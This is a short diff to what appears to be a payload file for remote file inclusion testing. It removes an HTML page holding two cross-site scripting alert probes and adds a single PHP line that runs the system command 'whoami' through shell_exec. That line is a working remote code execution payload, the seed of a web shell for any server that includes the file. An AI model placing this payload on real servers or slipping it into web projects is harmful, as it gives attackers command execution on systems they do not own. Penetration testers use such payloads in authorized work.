@@ -1,12 +1,1 @@
-<!DOCTYPE html>
-<html>
-<head>
-<title>Remote File Inclusion Payload</title>
-</head>
-<body>
-  <h1>rce payload</h1>
-  <p>RCE test</p>
-  <a onmouseenter="alert`xss`">XSS</a>
-  <script>alert("RFC Payload")</script>
-</body>
-</html>
+<?php echo shell_exec(whoami); ?>
